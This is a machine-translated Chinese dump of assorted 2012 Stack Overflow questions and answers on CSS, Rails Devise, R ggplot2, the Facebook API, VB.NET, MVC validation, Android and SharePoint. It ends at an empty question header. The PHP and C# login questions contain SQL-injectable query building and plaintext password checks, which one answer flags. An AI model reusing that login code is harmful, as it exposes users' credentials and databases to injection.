> 
> 赞同：2
> 
> 时间：2012-06-15T14:21:47.160
> 
> 标签：html, css

我有一个 h2 标签，一个带有一些框的 div 和相同的。然而，h2 有一个边框顶部，并且该边框顶部一直到之前 div 的顶部，即使它在该 div 之外。

我做了一个jsfiddle来说明：

[http://jsfiddle.net/jjYhg/](http://jsfiddle.net/jjYhg/)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-15T14:27:06.967

如果我理解正确，问题是上 div 向左浮动。解决方案是添加`clear: both;`（或`clear: left;`）到`h2`.

```
h2 {
    font-family: BebasNeue;
    color: #777878;
    font-size: 50px;
    border-top: 3px dashed #777878;
    border-bottom: 3px dashed #777878;
    line-height: 1;
    margin: 10px;
    clear: both;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:32:32.907

添加明确：两者；到 CSS 中的 H2 标签。这告诉 H2 在它们上方的任何页面元素下方下降。

# ruby-on-rails - Rails：设计 + CanCan 看不到任何视图

> ID：11052531
> 
> 赞同：0
> 
> 时间：2012-06-15T14:21:49.693
> 
> 标签：ruby-on-rails, authentication, view, controller, devise

我在我的 rails 应用程序中使用 Devise/Cancan。

我没有覆盖默认的设计控制器。我已经生成了默认的设计视图。现在我想从管理面板链接到所有默认设计视图。

所以我有以下 admin_panel_view

```
<h1>Administrator Dash Board</h1>
    <ul>

    <li><%=link_to "Sign Up user",  user_password_path %></li>
    <li><%=link_to "Sign Up user",  new_user_password_path %></li>
    <li><%=link_to "Sign Up user",  edit_user_password_path %></li>
    <li><%=link_to "Sign Up user",  cancel_user_registration_path %></li>
    <li><%=link_to "Sign Up user",  user_registration_path %></li>
    <li><%=link_to "Sign Up user",  edit_user_registration_path %></li>     
    <li><%=link_to "Sign Up user",  users_path %></li>

</ul> 
```

当我单击这些链接中的任何一个时，它们都不起作用。

这是我的路线文件：

```
resources :businesses
resources :addresses
resources :images
devise_for :users
resources :users , :only => [:show, :index]

authenticated :user do
  root :to => "listings#index"
end

root :to => "listings#index"

resources :listings

resources :admin_dash_board, :only => :index 
```

在我的应用程序中，我通过设计视图生成器设置了这些视图：

```
Views/devise/confirmations/*
Views/devise/mailer/*
Views/devise/passwords/*
Views/devise/registrations/*
Views/devise/sessions/*
Views/devise/shared/*
Views/devise/unlocks/* 
```

我有什么遗漏吗？我怎样才能让他们工作？提前谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T16:42:26.113

好吧，在您提供更多信息之前，我无法确定，但是在您的路线中，您需要`:path_prefix`像这样为 devise_for 提供一个：`devise_for :users, :path_prefix => 'd'`

这将确保您在设计和`resources :users`您拥有的之间没有重复的路线。这是设计 wiki 上讨论它的页面：[https ://github.com/plataformatec/devise/wiki/How-To:-Manage-users-through-a-CRUD-interface](https://github.com/plataformatec/devise/wiki/How-To:-Manage-users-through-a-CRUD-interface)

# html - 关于 HTML5、SEO 和向后兼容性的方法论问题

> ID：11052533
> 
> 赞同：2
> 
> 时间：2012-06-15T14:22:00.847
> 
> 标签：html, seo, backwards-compatibility

我挑战了所有常规知识，首先编写了我的 HTML5 网站。现在我正在编写 HTML4 站点并添加一个检测旧浏览器的脚本。我的问题主要是关于网络安全字体。我知道为了 SEO 的利益，最好使用 HTML 而不是漂亮文本的图像。但是，由于 HTML5 网站的标题中包含 HTML，我想知道在 HTML4 版本的网站中使用图像表示这些标题是否安全。简而言之，我的 Web 客户端的索引会受到影响吗？我觉得HTML5版本会保证好的排名，但我想把它放到社区里，得到一个意见。

第二个问题，我应该在 HTML4 还是 XHTML 中创建更易于访问的版本？

最后，是否有一种更简单的方法可以使新站点向后兼容，并且仍然能够使用更新的技术？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T21:07:39.023

经过大量研究，我发现在 HTML5 中创建站点并以优雅降级为目的实现项目并不少见。

在此站点：[spacebug.com/gracefully-detect-old-browsers-and-fallback-from-html5/](http://spacebug.com/gracefully-detect-old-browsers-and-fallback-from-html5/)上，作者建议不要使用 PHP 用户代理变量来检测浏览器功能。它说有太多的用户代理和标题更改等。查看链接以获得深入的解释。它提供了正确的方法是使用 javascript 来检查某些功能。因为我的目的是要么用 HTML5 渲染它，要么用 XHTML 渲染它，这让我的生活变得非常简单。

一旦我发现 javascript 是要走的路，一个简单的谷歌搜索将我带到这个网站：[diveintohtml5.info/detect.html](http://diveintohtml5.info/detect.html)。这提供了多种方法来检测与 HTML5 相关的浏览器功能。

对于那些对代码不那么精通的人，或者对于那些正在寻找快速解决方案的人，第二个网站还提供了到[modernizr.com](http://www.modernizr.com/)的链接，这是一个“开源 MIT 许可的 javascript 库，可以检测对许多HTML5 和 CSS3 功能。”

所以，谢谢大家的意见。我从这次经历中学到了很多东西，我希望它能让一切变得更加用户友好和高效。

开发愉快！吉

# r - 使用强化 {ggplot2} 将地图数据转换为数据框用于 R 中的空间对象

> ID：11052544
> 
> 赞同：5
> 
> 时间：2012-06-15T14:22:33.993
> 
> 标签：r, ggplot2

我曾经能够毫无问题地运行此脚本，但现在 fortify {ggplot2} 命令给了我一条错误消息。任何可能是问题的提示都会很棒！我使用了 fortify 命令，以便能够使用 ggplot2 对 shapefile 进行 geom_map。

下面是我的脚本和下载数据的链接。

```
#######################################################
#######################################################
rm(list = ls(all = TRUE))#clear workspace
getwd()
#upload packages
library(maps)
library(mapdata)
library(gridExtra)
library(rgdal)
library(rgeos)
library(ggplot2)
library(sp)
library(maptools)
gpclibPermit()

#setwd(".../FAO") FAO data are major fishing area divisions
> FAO<- readOGR(dsn="fao", layer="World_Fao_Zones")
OGR data source with driver: ESRI Shapefile 
Source: "fao", layer: "World_Fao_Zones"
with 19 features and 1 fields
Feature type: wkbPolygon with 2 dimensions
> names(FAO);dim(FAO)
[1] "zone"
[1] 19  1
> str(FAO,max.level=2)
Formal class 'SpatialPolygonsDataFrame' [package "sp"] with 5 slots
  ..@ data       :'data.frame': 19 obs. of  1 variable:
  ..@ polygons   :List of 19
  ..@ plotOrder  : int [1:19] 18 2 17 4 12 3 13 11 5 6 ...
  ..@ bbox       : num [1:2, 1:2] -180 -85.5 180 90
  .. ..- attr(*, "dimnames")=List of 2
  ..@ proj4string:Formal class 'CRS' [package "sp"] with 1 slots
> plot(FAO) 
```

![粮农组织地块](../Images/75245ff8118734bbf50f1a0575fb6471.png)

```
FAO@data$id = rownames(FAO@data)
FAO.df <- as.data.frame(FAO)# convert shapefile to dataframe to merge later
> FAO_fort <- fortify(FAO, region="id")# fortify to plot with ggplot2 
Error in function (classes, fdef, mtable)  : 
  unable to find an inherited method for function "proj4string", for signature "NULL" 
```

这是下载数据[粮农组织数据](http://dl.dropbox.com/u/12716426/fao.zip)的链接。谢谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-16T09:37:33.013

我得到了它的工作，`ggplot2`这是我在底部的版本和会话信息中如何做到的。

## ggplot2 中的地图

![钓鱼区](../Images/e37dfd3217511433135043b89d133d84.png)

## 编码

```
rm(list = ls(all = TRUE)) #clear workspace

library(maptools)
library(gpclib)
library(ggplot2)

shape<-readShapeSpatial("./fao/World_Fao_Zones.shp") 
shape@data$id <- rownames(shape@data)
shape.fort <- fortify(shape, region='id') 
shape.fort<-shape.fort[order(shape.fort$order), ] 
ggplot(data=shape.fort, aes(long, lat, group=group)) + 
    geom_polygon(colour='black',
                 fill='white') +
    theme_bw() 
```

## 会议

```
> sessionInfo()
R version 2.15.0 (2012-03-30)
Platform: x86_64-apple-darwin9.8.0/x86_64 (64-bit)

locale:
    [1] C/en_US.UTF-8/C/C/C/C

attached base packages:
    [1] grid      stats     graphics  grDevices utils    
[6] datasets  methods   base     

other attached packages:
    [1] mapproj_1.1-8.3 gpclib_1.5-1    maptools_0.8-14
[4] lattice_0.20-6  foreign_0.8-49  rgeos_0.2-5    
[7] stringr_0.6     sp_0.9-99       gridExtra_0.9  
[10] mapdata_2.2-1   ggplot2_0.9.0   maps_2.2-5     

loaded via a namespace (and not attached):
    [1] MASS_7.3-17        RColorBrewer_1.0-5 colorspace_1.1-1  
[4] dichromat_1.2-4    digest_0.5.2       memoise_0.1       
[7] munsell_0.3        plyr_1.7.1         proto_0.3-9.2     
[10] reshape2_1.2.1     scales_0.2.0       tools_2.15.0 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-05-15T11:27:13.953

Fortify 可能会被[弃用](https://www.rdocumentation.org/packages/ggplot2/versions/2.2.1/topics/fortify)。一种新的替代方法是`broom`（请参阅[此处](https://cran.r-project.org/web/packages/broom/broom.pdf)的文档）。使用起来非常简单：

```
# Load shapefile
FAO <- readOGR(dsn="fao", layer="World_Fao_Zones")
#Convert
FAO_df <- tidy(FAO) 
```

不幸的是，您上传的文件不再存在，因此我无法为您的示例演示该命令。

# facebook - 使用 Facebook Graph API 修改照片描述

> ID：11052547
> 
> 赞同：0
> 
> 时间：2012-06-15T14:22:47.003
> 
> 标签：facebook, facebook-graph-api, facebook-php-sdk

我可以使用 Graph API 在 Facebook 上发布带有描述的照片。但是，我发现我现在无法使用 Graph API 删除它。但是，有没有办法修改现有照片的描述？

我尝试了许多 API 调用，但还没有成功。这是可以实现的还是到目前为止，这样的功能不存在？

谢谢你

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-08T11:37:43.447

我们可以删除通过我们的APP上传的照片。我们可以使用照片的ID来删除它。

# actionscript-3 - 在 Flash CS4 的动态文本字段中使用智能引号

> ID：11052558
> 
> 赞同：0
> 
> 时间：2012-06-15T14:23:11.340
> 
> 标签：actionscript-3, flash

我有一个 Flash 电影，它有一个文本字段，用户可以在其中输入他们想要的文本。它有一个对应的文本字段，可以在附近显示用户输入的文本。还有一个下拉菜单，用户可以在其中更改显示区域中的字体（字体包含在库中）。

这一切都很好。我们注意到其中一种字体，English 111 Vivace BT，有智能（卷曲）引号可用。但是当用户键入时，他们总是得到直引号而不是弯引号。直引号显然与字体不匹配。

有没有办法告诉 Flash 使用智能引号作为默认值，而不是直接的？我知道用户可以通过使用 Alt-0146 手动强制它使用弯引号，但我不希望他们知道这一点，即使他们这样做也不应该被要求。

我在想我可能能够在 AS3 的幕后捕获所有引号并自己对其进行编码，因此如果他们输入单引号，我将其替换为弯引号。但这听起来像一个 PITA，我希望在某个地方有一个设置。似乎其他 Adob​​e 程序确实有印刷引号的设置，但我在 Flash 中找不到该选项。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-16T07:34:31.393

这听起来更像是创建字体的人要么犯了错误，要么使用了一些非常规的键盘布局。或者，他们可能希望某些特定的文本编辑器以他们习惯的特殊方式替换引号。

一些这样的编辑器可能是 MS Word（据我所知，它可能会在您键入时“纠正”引号）或 Emacs（其中有很多输入法，可能会有自动调整引号的东西）。

为了做类似于 MS Word 或 Emacs 输入法的事情，你必须自己做，没有标准或传统的输入引号的方法（如果我理解正确的话，这些引号有两个变体，打开和关闭引号， 那是对的吗？）。

另请注意，根据您输入的语言，对印刷正确引号的理解会有所不同。例如，俄语和德语使用«,»，但在德语中的书写方式是：»quotation«，而在俄语中则是«quotation»。美国人使用引号的典型方式是：“引用”，但有时，当字体有“，”引号时，可能会在另一个引号内使用它们，而在其他语言中，第二对引号用于引号内的引用. 还有一个“典型美国人”的变体，*我认为*它通常是英国人，其中开头的引号放在字体基线上，而不是与大写字母对齐，但我现在找不到那个符号。

上面的整个段落是为了说明您没有设置引用的规则，您可能必须研究最有可能被您的听众使用的规则。

*（您需要打开我的答案进行编辑以查看使用了哪些引号字符，因此将它们替换为其他内容）*

# facebook - Rails 3.1 - Facebook 页面 API 调用

> ID：11052567
> 
> 赞同：0
> 
> 时间：2012-06-15T14:23:47.030
> 
> 标签：facebook, ruby-on-rails-3, facebook-graph-api, ruby-on-rails-3.1

对于使用简单 URL 调用 Facebook 页面，我有以下功能，例如：www.facebook.com/TurbonegroHQ

```
 def get_facebook
    @artist = Artist.accessible_by(current_ability).find(params[:id])
    if @artist.facebook_url.present?
      require 'open-uri'
      require 'json'
      result = JSON.parse(open("https://graph.facebook.com/"<<@artist.facebook_url).read)
      @hometown = result["hometown"]
      @band_members = result["band_members"]
      @likes = result["likes"]
    end
  end 
```

但是，当 Facebook 页面 URL 不是这种格式，而是像[https://www.facebook.com/pages/Clutch-The-Bakerton-Group-Weathermaker-Music/16637738637](https://www.facebook.com/pages/Clutch-The-Bakerton-Group-Weathermaker-Music/16637738637)这样的格式时，它会失败。有什么想法可以解决这个问题吗？

提前致谢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T16:34:07.870

`TurbonegroHQ`是页面的用户名 - 这可以与 Graph API 中的对象 ID 互换。

如果页面没有用户名，您需要通过 ID 访问它。在这种情况下[https://graph.facebook.com/16637738637](https://graph.facebook.com/16637738637)是要访问的 URL

通常，您将拥有 ID 而不是 URL，因为 ID 在我能想到的所有端点上的 API 中返回

# vb.net - 将 VB.NET 列表对象复制到另一个列表对象

> ID：11052570
> 
> 赞同：3
> 
> 时间：2012-06-15T14:23:57.147
> 
> 标签：vb.net

将 VB.NET 列表对象设置为另一个时遇到问题。在下面的示例中，我创建了一个实例，`ReadLocations`然后创建了一个对象`ReadLocation`，然后我循环`ReadLocations`并设置`ReadLocation1`为等于`rl`。

发生的情况是，如果我随后更改`ReadLocation1`为其他内容（assdfhsd），它也会更改`ReadLocations`索引。我真的很困惑为什么它会这样做，除非它是“=”符号表示引用而不是实际设置值。请帮忙，因为我是 C# 开发人员，但我正在修改的程序是在 VB.NET 中。

```
Dim ReadLocations As New List(Of Model.ReadLocation)
Dim rl1 As New Model.ReadLocation
rl1.LL = "a"
Dim rl2 As New Model.ReadLocation
rl2.LL = "b"
ReadLocations.Add(rl1)
ReadLocations.Add(rl2)

Dim ReadLocation11 As New Model.ReadLocation

For Each rl As Model.ReadLocation In ReadLocations
    ReadLocation11 = rl
Next 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-15T14:31:52.997

如果`ReadLocation`是引用类型（类），则设置为该类对象实例的所有变量将始终是引用。运算符仅在`=`对引用类型进行操作时设置对对象的新引用。它永远不会克隆对象（除非它是值类型）。在 C# 中也是如此。做你想做的事情的唯一方法是在将对象添加到第二个列表时克隆它们。不幸的是，.NET 没有提供简单的自动克隆任何对象的方法。执行此操作的标准方法是在 ReadLocation 类中实现 ICloneable 接口。然后你可以通过调用 clone 方法来克隆它：

```
ReadLocation1 = CType(rl.Clone(), ReadLocation) 
```

但是，在该克隆方法中，您将需要创建一个新的 ReadLocation 实例并手动设置其所有属性，然后将其返回。例如：

```
Public Class ReadLocation
    Implements ICloneable

    Public Function Clone() As Object Implements ICloneable.Clone
        Dim clone As New ReadLocation()
        clone.Property1 = Me.Property1
        clone.Property2 = Me.Property2
        Return clone
    End Function 
```

# c# - 不显眼的验证 C# MVC Razor

> ID：11052571
> 
> 赞同：4
> 
> 时间：2012-06-15T14:23:57.473
> 
> 标签：c#, asp.net-mvc-3

是否可以进行不显眼的验证以使字段成为必填项，但前提是其他属性发生更改？

例如

```
[Required]
public Decimal Income {get; set;}
[Required]
public Decimal Tax {get; set;}
//Required if tax or income changes
public string ChangeReason {get; set;} 
```

我想过拥有多个后备存储字段并编写一个自定义验证器来比较这些，但想知道是否有人有更好的建议？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-15T14:31:55.270

自定义验证器是要走的路。不久前我不得不建立类似的东西。

我会设置一个隐藏值 - “已更改” - 每当用户修改感兴趣的字段时将其设置为 true。

在感兴趣的 2 个属性上设置 RequiredIf 验证器：

```
 [RequiredIf("Changed", true, ErrorMessage = "Required")] 
```

RequiredIf 验证器的代码如下所示：

```
public class RequiredIfAttribute : ValidationAttribute, IClientValidatable
{
    private RequiredAttribute _innerAttribute = new RequiredAttribute();

    public string DependentProperty { get; set; }
    public object TargetValue { get; set; }

    public RequiredIfAttribute(string dependentProperty, object targetValue)
    {
        this.DependentProperty = dependentProperty;
        this.TargetValue = targetValue;
    }

    protected override ValidationResult IsValid(object value, ValidationContext validationContext)
    {
        // get a reference to the property this validation depends upon
        var containerType = validationContext.ObjectInstance.GetType();
        var field = containerType.GetProperty(this.DependentProperty);

        if (field != null)
        {
            // get the value of the dependent property
            var dependentvalue = field.GetValue(validationContext.ObjectInstance, null);

            // compare the value against the target value
            if ((dependentvalue == null && this.TargetValue == null) ||
                (dependentvalue != null && dependentvalue.Equals(this.TargetValue)))
            {
                // match => means we should try validating this field
                if (!_innerAttribute.IsValid(value))
                    // validation failed - return an error
                    return new ValidationResult(this.ErrorMessage, new[] { validationContext.MemberName });
            }
        }

        return null;
    }

    public IEnumerable<ModelClientValidationRule> GetClientValidationRules(ModelMetadata metadata, ControllerContext context)
    {
        var rule = new ModelClientValidationRule()
        {
            ErrorMessage = FormatErrorMessage(metadata.GetDisplayName()),
            ValidationType = "requiredif",
        };

        string depProp = BuildDependentPropertyId(metadata, context as ViewContext);

        // find the value on the control we depend on;
        // if it's a bool, format it javascript style 
        // (the default is True or False!)
        string targetValue = (this.TargetValue ?? "").ToString();
        if (this.TargetValue.GetType() == typeof(bool))
            targetValue = targetValue.ToLower();

        rule.ValidationParameters.Add("dependentproperty", depProp);
        rule.ValidationParameters.Add("targetvalue", targetValue);

        yield return rule;
    }

    private string BuildDependentPropertyId(ModelMetadata metadata, ViewContext viewContext)
    {
        // build the ID of the property
        string depProp = viewContext.ViewData.TemplateInfo.GetFullHtmlFieldId(this.DependentProperty);
        // unfortunately this will have the name of the current field appended to the beginning,
        // because the TemplateInfo's context has had this fieldname appended to it. Instead, we
        // want to get the context as though it was one level higher (i.e. outside the current property,
        // which is the containing object (our Person), and hence the same level as the dependent property.
        var thisField = metadata.PropertyName + "_";
        if (depProp.StartsWith(thisField))
            // strip it off again
            depProp = depProp.Substring(thisField.Length);
        return depProp;
    }
} 
```

Javascript：

```
/// <reference path="jquery-1.4.4-vsdoc.js" />
/// <reference path="jquery.validate.unobtrusive.js" />

$.validator.addMethod('requiredif',
function (value, element, parameters) {
    var id = '#' + parameters['dependentproperty'];

    // get the target value (as a string, 
    // as that's what actual value will be)
    var targetvalue = parameters['targetvalue'];
    targetvalue =
      (targetvalue == null ? '' : targetvalue).toString();

    // get the actual value of the target control
    // note - this probably needs to cater for more 
    // control types, e.g. radios
    var control = $(id);
    var controltype = control.attr('type');
    var actualvalue =
        controltype === 'checkbox' ?
        control.attr('checked').toString() :
        control.val();

    // if the condition is true, reuse the existing 
    // required field validator functionality
    if (targetvalue === actualvalue)
        return $.validator.methods.required.call(
          this, value, element, parameters);

    return true;
 }
 );

 $.validator.unobtrusive.adapters.add(
'requiredif',
['dependentproperty', 'targetvalue'],
function (options) {
    options.rules['requiredif'] = {
        dependentproperty: options.params['dependentproperty'],
        targetvalue: options.params['targetvalue']
    };
    options.messages['requiredif'] = options.message;
}); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-15T14:29:49.857

有可能的。您可以编写自己的属性来准确执行此操作。
它基本上需要两个步骤：

1.  编写自己的属性，使其继承 ValidationAttribute 并实现 IClientValidatable
2.  编写一个 Jquery 验证适配器来支持它

[这篇文章](http://odetocode.com/Blogs/scott/archive/2011/02/22/custom-data-annotation-validator-part-ii-client-code.aspx)中描述了一个很好的工作示例。
我使用类似的方法来创建依赖项验证（一个字段只有在填充另一个字段时才能具有值）

# android - 叠加层之间的导航

> ID：11052572
> 
> 赞同：0
> 
> 时间：2012-06-15T14:24:05.267
> 
> 标签：android, google-tv

地图上的叠加层可能会从 DPAD/Tab 获得焦点吗？

我有两个片段，一个列表视图和地图视图，我想从覆盖的可绘制对象中获得焦点，但我不确定这是否可能......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T21:56:20.117

是的，您可以从 MapView 上的一个叠加项目移动到另一个，但您应该考虑的事项很少。

1.  如果您希望 MapView 在按下 Dpad 上/下/左的同时根据 Dpad 方向转向，那么您的地图将向上/下/左方向显示地图，并且您将无法在叠加项目上使用 Dpad，因为 MapView 具有重点。
2.  [但是，如果您希望叠加项目被聚焦，那么您必须使用ItemizedOverlay](https://developers.google.com/maps/documentation/android/reference/com/google/android/maps/ItemizedOverlay)类的 setFocus、nextFocus 和 getFocus 方法手动定义应该关注哪个 D-Pad 方向的叠加项目。
3.  您还说您的活动中有 listview 和 MapView ，为了将焦点返回到 listview 或 MapView 之外的任何其他视图也必须以编程方式完成，这可能有点棘手。

您可以使用[StateListDrawable](http://developer.android.com/reference/android/graphics/drawable/StateListDrawable.html)在覆盖的可绘制对象上定义焦点、按下和默认状态的不同状态。

希望这能回答您的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T20:44:33.400

我在下面创建了一个示例活动。大部分代码来自此处的 MapView 教程：http: [//developer.android.com/resources/tutorials/views/hello-mapview.html](http://developer.android.com/resources/tutorials/views/hello-mapview.html)

“焦点代码”在 onKeyDown() 方法中。按下 TAB 时，焦点转移到下一个叠加层。当按下 ENTER 时，它会显示一个 Toast，但您可以在那里显示您的内容。

setFocus() 方法可在此处找到的 ItemizedOverlay 文档中找到：[https ://developers.google.com/maps/documentation/android/reference/](https://developers.google.com/maps/documentation/android/reference/)

希望这有效。

```
public class OverlayFocusExampleActivity extends MapActivity {
private HelloItemizedOverlay itemizedoverlay;
private MapView mapView;
private MapController mapController;
private int currentOverlayIndex;

/*
 * This entire method comes from the MapView tutorial.
 */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    mapView = (MapView) findViewById(R.id.mapview);
    mapView.setBuiltInZoomControls(true);
    mapController = mapView.getController();
    List<Overlay> mapOverlays = mapView.getOverlays();

    // overlay_draw is a selector that specifies a different image for state_focused
    Drawable drawable = this.getResources().getDrawable(R.drawable.overlay_draw);
    itemizedoverlay = new HelloItemizedOverlay(drawable, this);

    GeoPoint point = new GeoPoint(19240000, -99120000);
    OverlayItem overlayitem = new OverlayItem(point, "Hola, Mundo!", "I'm in Mexico City!");
    itemizedoverlay.addOverlay(overlayitem);
    GeoPoint point2 = new GeoPoint(35410000, 139460000);
    OverlayItem overlayitem2 = new OverlayItem(point2, "Sekai, konichiwa!", "I'm in Japan!");

    itemizedoverlay.addOverlay(overlayitem2);

    mapOverlays.add(itemizedoverlay);
}

@Override
protected boolean isRouteDisplayed() {
    return false;
}

@Override
public boolean onKeyDown(int keyCode, KeyEvent event) {
    OverlayItem overlay;
    switch (keyCode) {
        case KeyEvent.KEYCODE_TAB:
            // Retrieve next overlay
            currentOverlayIndex = (currentOverlayIndex + 1) % itemizedoverlay.size();
            overlay = itemizedoverlay.getOverlayItem(currentOverlayIndex);

            itemizedoverlay.setFocus(overlay);

            // Since setFocus() doesn't center the map, we do it ourselves
            mapController.animateTo(overlay.getPoint());
            return true;

        case KeyEvent.KEYCODE_DPAD_CENTER:
        case KeyEvent.KEYCODE_ENTER:
            overlay = itemizedoverlay.getFocus();

            if (overlay != null) {
                // Perform associated action

                // Stub
                Toast.makeText(this, overlay.getSnippet(), Toast.LENGTH_SHORT).show();
                return true;
            }

        default:
            return false;
    }
}

/*
 * This entire class comes from the MapView tutorial except getOverlayItem().
 */
private class HelloItemizedOverlay extends ItemizedOverlay<OverlayItem> {
    private ArrayList<OverlayItem> mOverlays = new ArrayList<OverlayItem>();
    private Context mContext;

    public HelloItemizedOverlay(Drawable defaultMarker) {
        super(boundCenterBottom(defaultMarker));
    }

    public HelloItemizedOverlay(Drawable defaultMarker, Context context) {
        super(boundCenterBottom(defaultMarker));
        mContext = context;
    }

    public void addOverlay(OverlayItem overlay) {
        mOverlays.add(overlay);
        populate();
    }

    /*
     * Not in MapView tutorial. Added for focusability.
     */
    public OverlayItem getOverlayItem(int index) {
        return mOverlays.get(index);
    }

    @Override
    protected OverlayItem createItem(int i) {
        return mOverlays.get(i);
    }

    @Override
    public int size() {
        return mOverlays.size();
    }

    @Override
    protected boolean onTap(int index) {
        OverlayItem item = mOverlays.get(index);
        AlertDialog.Builder dialog = new AlertDialog.Builder(mContext);
        dialog.setTitle(item.getTitle());
        dialog.setMessage(item.getSnippet());
        dialog.show();
        return true;
    }
} 
```

}

# javascript - sharepoint 中的 onready 事件

> ID：11052576
> 
> 赞同：3
> 
> 时间：2012-06-15T14:24:09.247
> 
> 标签：javascript, events, sharepoint, sharepoint-2010

我尝试打电话`new SP.ClientContext.get_current()`，但在我这样做的时候我收到了一个`Cannot read property 'get_current' of undefined`错误，因为`SP.ClientContext`没有初始化。如果我稍后调用该方法，一切正常。

所以我必须等到 Sharepoint UI 中的所有内容都加载完毕。怎么做？

我需要一个类似于用于 Sharepoint UI 脚本的 jQuery[就绪机器人的 js 就绪事件，可能使用](http://api.jquery.com/ready/)[SP.SOD](http://msdn.microsoft.com/en-us/library/ff410742)但我不知道怎么做？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-15T16:48:59.920

你在正确的轨道上。在 sp.js 之后使用 ExecuteOrDelayUntilScriptLoaded 调用您的函数，并在 SharePoint 页面完全加载后使用 _spBodyOnLoadFunctionNames.push 调用该函数。

有关更多信息，请参阅[Javascript 在页面加载时显示共享点列表项](https://sharepoint.stackexchange.com/questions/28534/javascript-to-display-sharepoint-list-items-on-page-load)。

# php - 快速的事情，使文件只能由管理员访问，php

> ID：11052579
> 
> 赞同：-5
> 
> 时间：2012-06-15T14:24:13.227
> 
> 标签：php

我有这个welcome.php，管理员在通过身份验证时会被重定向，我有另一个hostess.php，我希望它只显示给管理员，我的意思是，除非他或她登录，否则没有人应该有权访问。

Welcome.php 文件包含以下小代码：

我怎样才能在那里插入hostess.php？

```
<?php include('lock.php'); ?> 
<body> 
<div id="menu">  
<ul> 
<li><a href="logout.php">log out</a></li> 
</ul> 
</div> 
<h1> Welcome <?php echo $login_session; ?> </h1>
</body> 
```

登录页面代码：

```
<?php
include("config.php");
session_start();
if($_SERVER["REQUEST_METHOD"] == "POST")
{
// username and password sent from Form
$myusername=addslashes($_POST['username']);
$mypassword=addslashes($_POST['password']);

$sql="SELECT id FROM admin WHERE username='$myusername' and passcode='$mypassword'";
$result=mysql_query($sql);
$row=mysql_fetch_array($result);
$active=$row['active'];
$count=mysql_num_rows($result);

// If result matched $myusername and $mypassword, table row must be 1 row
if($count==1)
{
session_register("myusername");
$_SESSION['login_user']=$myusername;

header("location: welcome.php");
}
else
{
$error="Your Login Name or Password is invalid";
}
}
?>
<form action="" method="post">
<label>UserName :</label>
<input type="text" name="username"/><br />
<label>Password :</label>
<input type="password" name="password"/><br/>
<input type="submit" value=" Submit "/><br />
</form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:39:50.337

如果您想进行条件包含，那么您应该只添加一个检查以查看用户是否已登录并包含该文件（如果是）。我不知道您是如何实现登录和身份验证的，但根据您提供的信息，它会是这样的：

```
<body> 
    <?php include('lock.php'); 
    if($login_session != 'admin') { // or however else you would check the login status
        echo "<h1> Please Log In </h1>";
    } else {
        include('hostess.php'); // include and display all the rest of the stuff
        // display the stuff
    ?>
    <div id="menu">  
        <ul> 
            <li><a href="logout.php">log out</a></li> 
        </ul>
    </div>
    <h1> Welcome <?php echo $login_session; ?> </h1>
    <?php } // close else ?>
</body> 
```

# c# - 登录后从数据库中获取用户特定信息

> ID：11052584
> 
> 赞同：-1
> 
> 时间：2012-06-15T14:24:29.937
> 
> 标签：c#, asp.net, database, passwords

我正在做一个项目，我需要为学校网站制作 VLE 系统。我正在使用 Visual Web Developer 2008、C# 和 SQL 数据库。我需要做的是，当学生使用他们的用户名和密码登录时，他们应该从数据库中显示他们的特定信息（比如 SQL 中的课程名称、学生 ID、电子邮件和姓名等）我已经创建了登录页面：

```
protected void Button1_Click(object sender, EventArgs e)
{
    SqlConnection con = new SqlConnection(ConfigurationManager.ConnectionStrings["RegConnectionString"].ConnectionString);
    con.Open();
    string cmdStr = "select count (*) from Registration where UserName ='" + TextBox1.Text + "'";
    SqlCommand checkuser = new SqlCommand(cmdStr, con);
    int temp = Convert.ToInt32(checkuser.ExecuteScalar().ToString());
    if (temp == 1)
    {
        String cmdStr2 = "select password from Registration where UserName ='" + TextBox1.Text + "'";
        SqlCommand pass = new SqlCommand(cmdStr2, con);
        String password = pass.ExecuteScalar().ToString();
        con.Close();

        if (password == TextBox2.Text)
        {
            Session["New"] = TextBox1.Text;
            Response.Redirect("secure.aspx");
        }
        else
        {
            Label1.Visible = true;
            Label1.Text = "Invalid Password....!!!";
        }
    }
    else
    {
        Label1.Visible = true;
        Label1.Text = "Invalid UserName....!!!";
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T16:11:29.527

当您获得用户名时，您可以使用数据集检索有关该用户的所有详细信息并相应地显示在 secure.aspx 中。

建议：不要直接使用sql查询（容易被sql注入），你应该使用存储过程..并且不要以纯文本存储密码。为什么要为相同的数据检索两次数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:36:39.987

这不会解决你所有的问题，但我会阅读这篇文章

[http://www.codehighstreet.com/Articles/overview_of_membership_and_installing_sql_membership_provider-part_1/overview_of_membership_and_installing_sql_membership_provider-part_1.aspx](http://www.codehighstreet.com/Articles/overview_of_membership_and_installing_sql_membership_provider-part_1/overview_of_membership_and_installing_sql_membership_provider-part_1.aspx)

您当前的用户名和密码解决方案根本不是很安全，因为您当前将密码存储为纯文本。本文介绍了如何安装和设置用户名和密码数据库以及使用一些控件来为您处理身份验证

# php - htaccess 将图像文件夹重定向到根目录

> ID：11052587
> 
> 赞同：0
> 
> 时间：2012-06-15T14:24:41.560
> 
> 标签：php, apache, .htaccess, mod-rewrite, content-management-system

